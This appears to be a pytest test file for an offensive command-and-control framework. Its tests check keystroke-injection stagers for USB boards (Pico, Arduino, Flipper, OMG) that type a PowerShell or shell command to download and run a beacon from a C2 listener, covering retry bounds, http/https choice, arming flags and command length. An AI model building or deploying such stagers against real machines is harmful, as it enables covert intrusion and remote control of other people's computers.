"""The download stager's safety properties.

Four defects, all of them invisible in the artefact and all of them shipped:

1. `ssl=True` was a LITERAL. A stager generated against an HTTP listener
   still said `https://`, so nothing downloaded and the board spent its whole
   budget knocking on a port that was never going to answer.
2. The retry loop was `while(1)`: a C2 that never answers left an invisible
   process polling for ever, with no end, no error and nothing the operator
   could point at.
3. `--from-payload` typed the REGISTERED command — for Windows, 11.4k chars —
   which is the exact problem the download mode exists for.
4. `--arm` on a board that cannot be armed, and `--arm-pin` without `--arm`,
   did nothing in silence. Arming is the only thing standing between a board
   and typing into the operator's own machine, so a flag that cannot take
   effect is an error, not a no-op.
"""
import os
import shutil
import subprocess
from unittest import mock

import pytest

from phantom.utils import short_stager as ss
from phantom.utils.builder import generate_dropper

HOST = "10.0.0.5"
PORT = 8443
TOKEN = "0123456789abcdef" * 4
LEGACY_LIMIT = 600


def _no_live_listener(monkeypatch):
    """Make `c2_use_ssl()` read the CONFIG, not a listener left by another test."""
    monkeypatch.setattr("phantom.core.c2_server.server_instance.thread", None,
                        raising=False)


def _run_hid(arg, tmp_path, name="artefact"):
    from phantom.modules.payload import PayloadModule
    out = os.path.join(str(tmp_path), name)
    with mock.patch("phantom.modules.payload.notifier") as note:
        PayloadModule().do_hid(f"{arg} --out {out}")
    content = None
    if os.path.isfile(out):
        with open(out, encoding="utf-8") as handle:
            content = handle.read()
    return content, note


def _errors(note):
    return " ".join(str(c) for c in note.error.call_args_list)


def _typed_from_sketch(content):
    """The command an Arduino sketch actually types, unescaped."""
    line = next(ln for ln in content.splitlines() if "Keyboard.print(F(" in ln)
    body = line.split('Keyboard.print(F("', 1)[1]
    body = body[:body.rindex('"));')]
    return body.replace('\\"', '"').replace("\\\\", "\\")


class TestTheSchemeFollowsTheListener:
    def test_an_http_listener_produces_an_http_stager(self, tmp_path,
                                                     monkeypatch):
        _no_live_listener(monkeypatch)
        monkeypatch.setenv("PHANTOM_C2_SSL", "0")
        content, _ = _run_hid("pico --stager windows --type-into windows",
                              tmp_path)
        assert content is not None
        assert "http://" in content
        assert "https://" not in content, (
            "a stager against an HTTP listener must not say https:// — it "
            "downloads nothing and burns the whole retry budget")

    def test_https_is_still_the_default(self, tmp_path, monkeypatch):
        _no_live_listener(monkeypatch)
        monkeypatch.delenv("PHANTOM_C2_SSL", raising=False)
        content, _ = _run_hid("pico --stager windows --type-into windows",
                              tmp_path)
        assert content is not None
        assert "https://" in content

    def test_the_inline_stager_obeys_the_same_setting(self, tmp_path,
                                                     monkeypatch):
        _no_live_listener(monkeypatch)
        monkeypatch.setenv("PHANTOM_C2_SSL", "0")
        content, _ = _run_hid("pico --stager windows --type-into windows "
                              "--stager-mode inline", tmp_path)
        assert content is not None
        assert "https://" not in content

    def test_a_live_listener_outranks_the_config(self, monkeypatch):
        class _Srv:
            use_ssl = False

            class thread:
                @staticmethod
                def is_alive():
                    return True

        monkeypatch.setenv("PHANTOM_C2_SSL", "1")
        monkeypatch.setattr("phantom.core.c2_server.server_instance", _Srv)
        from phantom.utils.network import c2_use_ssl
        assert c2_use_ssl() is False, "the LIVE listener is what the target reaches"


class TestTheRetryLoopIsBounded:
    def test_the_windows_loop_carries_its_budget(self):
        cmd = ss.hid_download_command("windows", HOST, PORT, token=TOKEN)
        assert f"while($i -lt {ss.DEFAULT_ATTEMPTS})" in cmd
        assert "$i++" in cmd

    def test_there_is_no_unbounded_loop(self):
        for platform in ("windows", "linux", "macos"):
            cmd = ss.hid_download_command(platform, HOST, PORT, token=TOKEN)
            assert "while(1)" not in cmd, platform

    def test_the_budget_is_configurable(self):
        assert "while($i -lt 3)" in ss.hid_download_command(
            "windows", HOST, PORT, token=TOKEN, attempts=3)
        assert "[ $i -ge 3 ]" in ss.hid_download_command(
            "linux", HOST, PORT, token=TOKEN, attempts=3)

    def test_the_environment_can_set_it(self, monkeypatch):
        monkeypatch.setenv("PHANTOM_STAGER_ATTEMPTS", "4")
        assert ss._configured_attempts() == 4

    def test_a_bounded_loop_still_fits_the_hid_budget(self):
        for platform in ("windows", "linux", "macos"):
            cmd = ss.hid_download_command(platform, HOST, PORT, token=TOKEN)
            assert len(cmd) < LEGACY_LIMIT

    def test_the_posix_loop_exits_after_its_budget(self, tmp_path):
        """The point of the budget: the loop GIVES UP, it does not hang.

        Run under an IN-BAND watchdog (`timeout`) rather than pytest's own
        subprocess timeout, so a loop that never gives up is a RED test in
        seconds instead of a job that hangs until somebody kills it — the
        failure mode this test exists to catch is "runs for ever", and a test
        that also runs for ever when it catches it is not a test.
        """
        shell = shutil.which("sh")
        watchdog = shutil.which("timeout")
        if not shell or not watchdog:
            pytest.skip("needs a POSIX shell and GNU timeout on this host")
        stub_dir = tmp_path / "bin"
        stub_dir.mkdir()
        stub = stub_dir / "curl"
        stub.write_text("#!/bin/sh\nprintf x >> calls.count\nexit 1\n",
                        encoding="utf-8")
        stub.chmod(0o755)
        cmd = ss.build_short_stager("linux", "https://10.0.0.5:8443/p",
                                    host=HOST, port=PORT, retry_s=1,
                                    attempts=2)
        env = dict(os.environ)
        env["PATH"] = str(stub_dir) + os.pathsep + env.get("PATH", "")
        proc = subprocess.run([watchdog, "15", shell, "-c", cmd],
                              cwd=str(tmp_path), env=env, capture_output=True,
                              text=True, timeout=90)
        assert proc.returncode != 124, (
            "the loop was STILL polling when the 15s watchdog fired: it has "
            "no attempt budget")
        assert proc.returncode != 0, (
            "the loop must EXIT non-zero once the budget is spent, not keep "
            f"polling (stdout={proc.stdout!r} stderr={proc.stderr!r})")
        calls = (tmp_path / "calls.count").read_text(encoding="utf-8")
        assert calls == "xx", (
            f"it must spend exactly its budget ({len(calls)} attempt(s) made)")


class TestAndroidIsNotAKeyboardChannel:
    def test_the_download_mode_refuses_android(self):
        with pytest.raises(ValueError) as excinfo:
            ss.hid_download_command("android", HOST, PORT, token=TOKEN)
        assert "not a HID channel" in str(excinfo.value)

    def test_the_refusal_reaches_the_operator(self, tmp_path):
        content, note = _run_hid("pico --stager android --type-into android",
                                 tmp_path)
        assert content is None
        assert "not a HID channel" in _errors(note)


class TestFromPayloadHonoursTheMode:
    REGISTERED_HOST = "10.9.9.9"

    def _entry(self, use_ssl=True):
        return {
            "id": "3f2a91c4-1111-2222-3333-444455556666",
            "platform": "windows",
            "command": generate_dropper("windows", self.REGISTERED_HOST, PORT,
                                        use_ssl=use_ssl, resilient=True),
            "description": "Custom C++ Beacon (x64)",
            "source": "c2_shell",
        }

    def _inventory(self, monkeypatch, **kwargs):
        monkeypatch.setattr("phantom.utils.payload_manager.get_custom_beacons",
                            lambda: [self._entry(**kwargs)])

    def test_the_registered_command_really_is_the_long_one(self):
        # the premise: without the flag, --from-payload types 11.4k chars
        assert len(self._entry()["command"]) > 5000

    def test_alone_it_still_types_the_registered_command(self, tmp_path,
                                                         monkeypatch):
        """The baseline contract of --from-payload, kept on purpose."""
        self._inventory(monkeypatch)
        content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                              "windows", tmp_path)
        assert content is not None
        assert " -Enc " in content, (
            "--from-payload without --stager-mode types the command that "
            "already exists; download there is available, not assumed")

    def test_download_is_honoured_when_asked_for(self, tmp_path, monkeypatch):
        self._inventory(monkeypatch)
        content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                              "windows --stager-mode download", tmp_path)
        assert content is not None, (
            "asking for download must reach the short fetcher, not be ignored")
        assert " -Enc " not in content, "the 11.4k registered command was typed"
        assert "/s/windows" in content

    def test_the_download_command_fits_the_hid_budget(self, tmp_path,
                                                    monkeypatch):
        self._inventory(monkeypatch)
        content, _ = _run_hid("arduino --from-payload 3f2a91c4 --type-into "
                              "windows --stager-mode download", tmp_path)
        assert content is not None
        typed = _typed_from_sketch(content)
        assert len(typed) < LEGACY_LIMIT, len(typed)
        assert typed.startswith("powershell ")

    def test_the_endpoint_comes_from_the_payload_not_this_session(
            self, tmp_path, monkeypatch):
        """A payload built for ANOTHER listener must keep pointing there."""
        self._inventory(monkeypatch)
        content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                              "windows --stager-mode download", tmp_path)
        assert content is not None
        assert f"{self.REGISTERED_HOST}:{PORT}" in content
        from phantom.modules.payload import PayloadModule
        session_host = PayloadModule()._get_lhost()
        if session_host and session_host != self.REGISTERED_HOST:
            assert f"{session_host}:{PORT}" not in content, (
                "the stager was re-pointed at the current session instead of "
                "the endpoint the payload was built for")

    def test_the_registered_scheme_travels_with_the_endpoint(self, tmp_path,
                                                             monkeypatch):
        self._inventory(monkeypatch, use_ssl=False)
        content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                              "windows --stager-mode download", tmp_path)
        assert content is not None
        assert "http://" in content
        assert "https://" not in content

    def test_inline_remains_available_explicitly(self, tmp_path, monkeypatch):
        self._inventory(monkeypatch)
        content, _ = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                              "windows --stager-mode inline", tmp_path)
        assert content is not None
        assert " -Enc " in content

    def test_a_command_without_a_readable_endpoint_is_refused(self, tmp_path,
                                                              monkeypatch):
        monkeypatch.setattr(
            "phantom.utils.payload_manager.get_custom_beacons",
            lambda: [{"id": "3f2a91c4-1111-2222-3333-444455556666",
                      "platform": "windows", "command": "echo hello",
                      "description": "hand made"}])
        content, note = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                                 "windows --stager-mode download", tmp_path)
        assert content is None
        assert "carries no C2 endpoint" in _errors(note)

    def test_reading_the_endpoint_out_of_both_registered_shapes(self):
        for platform in ("windows", "linux", "macos"):
            for use_ssl in (True, False):
                command = generate_dropper(platform, self.REGISTERED_HOST,
                                           PORT, use_ssl=use_ssl,
                                           resilient=True)
                assert ss.endpoint_from_registered_command(
                    command) == (self.REGISTERED_HOST, PORT, use_ssl)
        assert ss.endpoint_from_registered_command("echo hello") is None
        assert ss.endpoint_from_registered_command("") is None


class TestFlagsThatCannotTakeEffectAreErrors:
    def test_arm_on_a_board_that_cannot_be_armed(self, tmp_path):
        for board in ("pico", "flipper", "omg"):
            content, note = _run_hid(f"{board} whoami --arm", tmp_path)
            assert content is None, board
            assert "--arm needs a board" in _errors(note), board

    def test_arm_on_an_arduino_board_still_works(self, tmp_path):
        content, note = _run_hid("arduino whoami --arm", tmp_path)
        assert content is not None
        assert content.count("waitPress();") == 2
        assert "--arm needs a board" not in _errors(note)

    def test_arm_pin_without_arm(self, tmp_path):
        content, note = _run_hid("arduino whoami --arm-pin 9", tmp_path)
        assert content is None
        assert "--arm-pin has no effect without --arm" in _errors(note)

    def test_arm_pin_with_arm_still_works(self, tmp_path):
        content, note = _run_hid("arduino whoami --arm --arm-pin 9", tmp_path)
        assert content is not None
        assert "static const uint8_t ARM_PIN = 9;" in content

    def test_stager_attempts_without_a_stager(self, tmp_path):
        content, note = _run_hid("pico whoami --stager-attempts 5", tmp_path)
        assert content is None
        assert "--stager-attempts configures the DOWNLOAD" in _errors(note)

    def test_stager_attempts_with_the_inline_mode(self, tmp_path):
        content, note = _run_hid("pico --stager windows --type-into windows "
                                 "--stager-mode inline --stager-attempts 5",
                                 tmp_path)
        assert content is None
        assert "inline has no loop" in _errors(note)

    def test_a_zero_budget_is_refused(self, tmp_path):
        content, note = _run_hid("pico --stager windows --type-into windows "
                                 "--stager-attempts 0", tmp_path)
        assert content is None
        assert "at least 1" in _errors(note)

    def test_the_budget_reaches_the_typed_command(self, tmp_path):
        content, _ = _run_hid("pico --stager windows --type-into windows "
                              "--stager-attempts 7", tmp_path)
        assert content is not None
        assert "while($i -lt 7)" in content

    def test_an_attempt_budget_on_a_from_payload_with_no_mode(self, tmp_path,
                                                             monkeypatch):
        """A budget the typed command cannot honour is an error, not a shrug."""
        monkeypatch.setattr(
            "phantom.utils.payload_manager.get_custom_beacons",
            lambda: [{"id": "3f2a91c4-1111-2222-3333-444455556666",
                      "platform": "windows",
                      "command": generate_dropper("windows", HOST, PORT,
                                                  use_ssl=True,
                                                  resilient=True),
                      "description": "Custom C++ Beacon (x64)"}])
        content, note = _run_hid("pico --from-payload 3f2a91c4 --type-into "
                                 "windows --stager-attempts 5", tmp_path)
        assert content is None, (
            "the registered command has no retry loop to bound")
        assert "--stager-mode download" in _errors(note)
